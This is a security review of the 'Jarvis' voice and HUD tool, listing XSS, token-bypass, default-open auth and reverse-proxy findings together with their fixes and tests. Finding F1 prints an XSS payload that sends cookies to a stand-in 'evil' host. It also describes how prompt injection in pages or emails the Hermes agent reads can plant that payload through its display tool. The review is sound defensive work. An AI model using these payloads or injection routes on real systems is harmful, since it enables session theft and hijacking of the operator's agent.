# Jarvis — Security Review

Scope: full review of the Jarvis voice + HUD tool (`server/`, `client/`,
`worker/`, `hermes-plugin/`, `server/hud/index.html`). Threat model: a LAN on
which not every host/user is trusted (the server binds `0.0.0.0` and exposes
plain-`ws`, TLS-`wss`, and a dashboard reverse-proxy), plus a prompt-injectable
agent (Hermes) that can call the HUD's `hud_display` tool.

**Backdoor check: none found.** No `eval`/`exec`/`os.system`/`shell=True`/
`pickle`/`marshal`/`__import__` in production code; the only `subprocess` call
(`worker/worker_stats.py`) uses a fixed argv list. All outbound network hosts
are reviewed and expected (loopback, LAN placeholders, `api.elevenlabs.io`,
YouTube/Google-Fonts/W3C in the HUD). The secret-redaction filter
(`SECRET_RES`) actively prevents API keys/passwords from being spoken to cloud
TTS. See `tests/test_backdoor_scan.py` (enforced continuously).

---

## Status (update)

- **F1 — FIXED** (`feat-proactive-jarvis`): `summonPanel` now HTML-escapes
  `title` (`escHtml`) and `encodeURI`s / scheme-validates `src`; the new
  chart/glance renderers escape all agent-supplied labels/values; server clamps
  panel fields. Regression guards in `tests/test_security_exploits.py`.
- **F2 — FIXED**: `_ws_allowed` now requires the token for Origin-less clients
  when one is configured (`?token=` / cookie); native clients (`client.py`,
  `ws_e2e_test.py`) updated to pass it.
- **F3, F4 — still open** (auth-off-by-default posture; dashboard proxy exposure).
  Tracked below; not addressed in this change.

## Findings

### F1 — Stored/DOM XSS in the HUD via `/api/summon` (HIGH, confidence 9/10) — FIXED

`server/hud/index.html:788` and `:779`; server relay `server/server.py:863-887`.

`summonPanel()` builds `innerHTML` with the attacker-controlled `title`
(`◈ ${title}`) and, on the iframe branch, the raw `src`
(`src="${embedURL(src)}"`) — **neither is HTML-escaped**, while sibling sinks in
the same file (`addActivity`, `showApproval`) do call `esc()`. `toUpperCase()`
does not neutralise HTML. The `/api/summon` endpoint performs no validation and
broadcasts the body verbatim to every connected HUD over the WebSocket.

**Exploit paths**

- *Unauthenticated (default posture, F3):* any LAN host does
  `POST http://server:8765/api/summon` with
  `{"title":"<img src=x onerror=fetch('//evil/?c='+document.cookie)>"}`. It is
  pushed to every open HUD and executes in the operator's browser.
- *With a token set:* the Hermes agent's `hud_display` tool legitimately calls
  `/api/summon` with the token. A prompt-injection in any content the agent
  processes (a web page it reads, an email, a voice command) can set a malicious
  `title`/`src` — `tools.py` truncates title to 48 chars but does not sanitise,
  and 48 chars is plenty for `<img src=x onerror=eval(name)>`.

**Impact:** JS execution in the operator's browser → theft of the
`jarvis_token` cookie (set in JS at `index.html:833`, so **not** `HttpOnly`) →
full auth bypass to every `/api` endpoint and the dashboard reverse-proxy;
plus the ability to drive the agent and pivot to the internal dashboard.

**Fix:** escape `title` (`◈ ${esc(title)}`); validate/encode `src` on the iframe
path (allow-list scheme `http/https`, reject quotes) as the image/video paths
already do with `encodeURI`; validate `media`/`position`/`src` server-side in
`/api/summon`. PoC: `tests/test_security_exploits.py::test_hud_renders_summon_title_without_escaping`,
`::test_summon_relays_xss_payload_unsanitized`.

---

### F2 — WebSocket token gate bypassed by Origin-less clients (MEDIUM, 9/10) — FIXED

`server/server.py:700-712` (`_ws_allowed`).

When a token is configured, the token check is **skipped entirely** for any
request without an `Origin` header (`if not origin: return True`). Browsers
always send `Origin`; native clients (curl, Python, any script) do not. So the
token protects browsers but not scripted LAN clients on the `/ws` channel — the
primary agent-control channel (`start`/`stop_run`/`approval_decision` and audio
turns that make the agent run tools).

**Impact:** the configured token provides no protection against a non-browser
LAN attacker on `/ws`; they get an authenticated-equivalent agent channel.

**Fix:** when a token is configured, require it (cookie or `?token=`) regardless
of Origin; keep the Origin allow-list as an additional browser-only check. PoC:
`tests/test_security_exploits.py::test_ws_originless_client_bypasses_token`.

---

### F3 — Auth disabled by default exposes privileged surfaces (MED→HIGH, 8/10)

`server/server.py:680-697`, `:963-1035`; `server.example.yaml:63-64`
("`unset = auth disabled`").

If `JARVIS_HUD_TOKEN` is unset (the documented default), `hud_token()` returns
`None` and `_request_authed()` returns `True` for everything. Because the server
binds `0.0.0.0`, the entire `/api` surface, the `/api/summon` broadcaster (F1),
and the **dashboard TLS reverse-proxy** are open to anyone on the LAN.

**Impact:** the dashboard proxy (F4) forwards to the Hermes admin dashboard that
is otherwise bound to loopback `127.0.0.1:9119`; with no token it becomes
LAN-reachable and unauthenticated. Combined with F1 this is unauthenticated XSS
+ admin-surface exposure.

**Fix:** fail closed — refuse to start the network-exposed listeners without a
token (or bind loopback when unset); make the token mandatory in docs. PoC:
`tests/test_security_exploits.py::test_default_posture_exposes_privileged_surfaces`.

---

### F4 — Dashboard reverse-proxy widens loopback admin surface + strips CSP/XFO (MEDIUM, 8/10)

`server/server.py:958-1035`.

`dash_app` reverse-proxies **all** methods/paths and WebSockets to
`http://127.0.0.1:9119` (the Hermes dashboard, intentionally loopback-only) and
strips `content-security-policy` and `x-frame-options` from responses
(`_STRIP_HEADERS`, `:964`). The only gate is the optional shared token (F3).

**Impact:** an internal admin dashboard designed for loopback becomes reachable
from the whole LAN over TLS, with its framing/CSP protections removed
(clickjacking / embedding, and full proxied access when the token is unset or
stolen via F1).

**Fix:** require the token unconditionally on `dash_app`; do not strip CSP —
instead add a narrowly-scoped `frame-ancestors` for the HUD origin only; bind
the proxy to the host's LAN interface only if a token is present.

---

## Lower-severity / informational

- **`hermes_proxy` exposes `POST /v1/responses`** (`server.py:729`, `:734`) —
  raw agent invocation, gated only by the shared token. Intentional, but note
  it is a powerful primitive behind a single secret.
- **`worker/worker_stats.py:45` uses `os.environ` without `import os`** — a
  runtime `NameError`, functional bug (not a vulnerability); `stats()` crashes.
- **Self-signed TLS** (`make-certs.sh`, RSA-2048/825d) is appropriate for a LAN
  appliance; no weakness.

---

## Test coverage delivered

`tests/` — 72 tests, run offline (heavy deps stubbed):

- **unit** (`test_unit_security.py`): secret redaction, proxy allow-list
  (incl. path-traversal), HTTP/WS auth logic, sentence splitting.
- **integration** (`test_integration_api.py`): auth middleware, `/api/chat`
  validation + graceful 502, proxy 403s, summon token gate, dashboard 401.
- **e2e** (`test_e2e_ws.py`): full `/ws` turn protocol + error paths.
- **security PoC** (`test_security_exploits.py`): F1–F3 proven executable.
- **backdoor scan** (`test_backdoor_scan.py`): sink + outbound-host allow-list.

Run: `pip3 install -r tests/requirements-test.txt && pytest`.
